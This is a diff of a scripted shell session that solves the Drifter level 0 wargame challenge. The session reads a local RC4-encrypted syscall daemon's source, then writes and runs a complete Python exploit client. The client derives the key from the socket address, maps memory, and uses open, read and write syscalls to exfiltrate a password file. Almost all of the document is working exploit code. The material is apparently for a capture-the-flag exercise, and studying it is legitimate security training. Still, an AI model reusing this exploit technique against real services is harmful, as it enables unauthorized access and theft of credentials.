@@ -1,93 +1,88 @@
 @sleep 1
 id
-echo '# Drifter L0: RC4-syscall daemon on 127.0.0.1:1111. Source is world-readable:'
 ls -la /drifter/drifter0_src/
 cat /drifter/drifter0_src/drifter0.c
-echo '# key facts: keymat = source IP(4)+port(2) as the SERVER sees it (getsockname),'
-echo '# both RC4 streams skip 42*6 keystream bytes, then 36-byte encrypted frames:'
-echo '# syscall(nr, a1..a8) with the 4-byte int return encrypted back.'
-echo '# Writing the client (heredoc, code visible):'
-@line cat > /tmp/drifter0_client.py <<'PYEOF'
-@line import socket, struct, sys, time
-@line HOST = "127.0.0.1"
-@line PORT = 1111
-@line def rc4(state, x, y, data):
-@line     buf = bytearray(data)
-@line     for i in range(len(buf)):
-@line         x = (x + 1) % 256
-@line         y = (state[x] + y) % 256
-@line         state[x], state[y] = state[y], state[x]
-@line         buf[i] ^= state[(state[x] + state[y]) % 256]
-@line     return state, x, y, bytes(buf)
-@line def prepare_key(keymat):
-@line     s = list(range(256)); j = 0
-@line     for i in range(256):
-@line         j = (keymat[i % len(keymat)] + s[i] + j) % 256
-@line         s[i], s[j] = s[j], s[i]
-@line     return s, 0, 0
-@line def call(sock, K, nr, *a):
-@line     a = a + (0,) * (8 - len(a))
-@line     sti, xi, yi, sto, xo, yo = K
-@line     sti, xi, yi, enc = rc4(sti, xi, yi, struct.pack("<9I", nr, *a))
-@line     sock.sendall(enc)
-@line     r = b""
-@line     while len(r) < 4:
-@line         c = sock.recv(4 - len(r))
-@line         if not c: raise EOFError
-@line         r += c
-@line     sto, xo, yo, dec = rc4(sto, xo, yo, r)
-@line     return (sti, xi, yi, sto, xo, yo), struct.unpack("<i", dec)[0]
-@line s = socket.create_connection((HOST, PORT), timeout=10)
-@line me = s.getsockname()          # what the SERVER sees as the peer
-@line keymat = socket.inet_aton(me[0]) + struct.pack(">H", me[1])
-@line print("keymat:", keymat.hex())
-@line sti, xi, yi = prepare_key(keymat)
-@line sto, xo, yo = prepare_key(keymat)
-@line for _ in range(42):          # skip 42*6 keystream bytes both ways
-@line     sti, xi, yi, _ = rc4(sti, xi, yi, b"\0" * 6)
-@line     sto, xo, yo, _ = rc4(sto, xo, yo, b"\0" * 6)
-@line K = (sti, xi, yi, sto, xo, yo)
-@line K, uid = call(s, K, 24); print("getuid ->", uid)
-@line K, page = call(s, K, 192, 0x10000000, 0x1000, 3, 0x22, 0xffffffff, 0)
-@line print("mmap2 ->", hex(page & 0xffffffff)); page &= 0xffffffff
-@line pathfd = None
-@line for fd in (3, 4, 5, 6):
-@line     K, r = call(s, K, 108, fd, page + 0x400, 0)
-@line     if r == 0:
-@line         pathfd = fd; break
-@line print("socket fd:", pathfd)
-@line sti, xi, yi, sto, xo, yo = K
-@line sti, xi, yi, enc = rc4(sti, xi, yi,
-@line     struct.pack("<9I", 3, pathfd, page, 19, 0, 0, 0, 0, 0))
-@line s.sendall(enc); s.sendall(b"/drifter0.password\0")
-@line r = b""
-@line while len(r) < 4:
-@line     r += s.recv(4 - len(r))
-@line sto, xo, yo, dec = rc4(sto, xo, yo, r)
-@line K = (sti, xi, yi, sto, xo, yo)
-@line print("read path ->", struct.unpack("<i", dec)[0])
-@line K, fdr = call(s, K, 5, page, 0, 0)
-@line print("open ->", fdr)
-@line K, n = call(s, K, 3, fdr, page + 0x200, 64)
-@line print("read file ->", n)
-@line sti, xi, yi, sto, xo, yo = K
-@line sti, xi, yi, enc = rc4(sti, xi, yi,
-@line     struct.pack("<9I", 4, pathfd, page + 0x200, n, 0, 0, 0, 0, 0))
-@line s.sendall(enc)
-@line data = b""
-@line s.settimeout(5)
-@line while len(data) < n + 4:
-@line     c = s.recv(64)
-@line     if not c: break
-@line     data += c
-@line print("EXFIL raw:", data[:n])
-@line sto, xo, yo, dec = rc4(sto, xo, yo, data[n:n+4])
-@line print("write ->", struct.unpack("<i", dec)[0])
-@line s.close()
-@line PYEOF
-python3 /tmp/drifter0_client.py
-echo rc=$?
-echo '# Verify: the password file itself (readable by drifter0, uid 19000):'
+cat /drifter/drifter0_src/rc4.c
+mkdir -p /run/screen/d0 && cd /run/screen/d0
+@vi /run/screen/d0/drifter0_client.py
+import socket, struct, sys, time
+HOST = "127.0.0.1"
+PORT = 1111
+def rc4(state, x, y, data):
+    buf = bytearray(data)
+    for i in range(len(buf)):
+        x = (x + 1) % 256
+        y = (state[x] + y) % 256
+        state[x], state[y] = state[y], state[x]
+        buf[i] ^= state[(state[x] + state[y]) % 256]
+    return state, x, y, bytes(buf)
+def prepare_key(keymat):
+    s = list(range(256)); j = 0
+    for i in range(256):
+        j = (keymat[i % len(keymat)] + s[i] + j) % 256
+        s[i], s[j] = s[j], s[i]
+    return s, 0, 0
+def call(sock, K, nr, *a):
+    a = a + (0,) * (8 - len(a))
+    sti, xi, yi, sto, xo, yo = K
+    sti, xi, yi, enc = rc4(sti, xi, yi, struct.pack("<9I", nr, *a))
+    sock.sendall(enc)
+    r = b""
+    while len(r) < 4:
+        c = sock.recv(4 - len(r))
+        if not c: raise EOFError
+        r += c
+    sto, xo, yo, dec = rc4(sto, xo, yo, r)
+    return (sti, xi, yi, sto, xo, yo), struct.unpack("<i", dec)[0]
+s = socket.create_connection((HOST, PORT), timeout=10)
+me = s.getsockname()          # what the SERVER sees as the peer
+keymat = socket.inet_aton(me[0]) + struct.pack(">H", me[1])
+print("keymat:", keymat.hex())
+sti, xi, yi = prepare_key(keymat)
+sto, xo, yo = prepare_key(keymat)
+for _ in range(42):          # skip 42*6 keystream bytes both ways
+    sti, xi, yi, _ = rc4(sti, xi, yi, b"\0" * 6)
+    sto, xo, yo, _ = rc4(sto, xo, yo, b"\0" * 6)
+K = (sti, xi, yi, sto, xo, yo)
+K, uid = call(s, K, 24); print("getuid ->", uid)
+K, page = call(s, K, 192, 0x10000000, 0x1000, 3, 0x22, 0xffffffff, 0)
+print("mmap2 ->", hex(page & 0xffffffff)); page &= 0xffffffff
+pathfd = None
+for fd in (3, 4, 5, 6):
+    K, r = call(s, K, 108, fd, page + 0x400, 0)
+    if r == 0:
+        pathfd = fd; break
+print("socket fd:", pathfd)
+sti, xi, yi, sto, xo, yo = K
+sti, xi, yi, enc = rc4(sti, xi, yi,
+    struct.pack("<9I", 3, pathfd, page, 19, 0, 0, 0, 0, 0))
+s.sendall(enc); s.sendall(b"/drifter0.password\0")
+r = b""
+while len(r) < 4:
+    r += s.recv(4 - len(r))
+sto, xo, yo, dec = rc4(sto, xo, yo, r)
+K = (sti, xi, yi, sto, xo, yo)
+print("read path ->", struct.unpack("<i", dec)[0])
+K, fdr = call(s, K, 5, page, 0, 0)
+print("open ->", fdr)
+K, n = call(s, K, 3, fdr, page + 0x200, 64)
+print("read file ->", n)
+sti, xi, yi, sto, xo, yo = K
+sti, xi, yi, enc = rc4(sti, xi, yi,
+    struct.pack("<9I", 4, pathfd, page + 0x200, n, 0, 0, 0, 0, 0))
+s.sendall(enc)
+data = b""
+s.settimeout(5)
+while len(data) < n + 4:
+    c = s.recv(64)
+    if not c: break
+    data += c
+print("EXFIL raw:", data[:n])
+sto, xo, yo, dec = rc4(sto, xo, yo, data[n:n+4])
+print("write ->", struct.unpack("<i", dec)[0])
+s.close()
+@viend
+python3 /run/screen/d0/drifter0_client.py
 cat /home/drifter0/chroot/drifter0.password
 @sleep 2
 exit
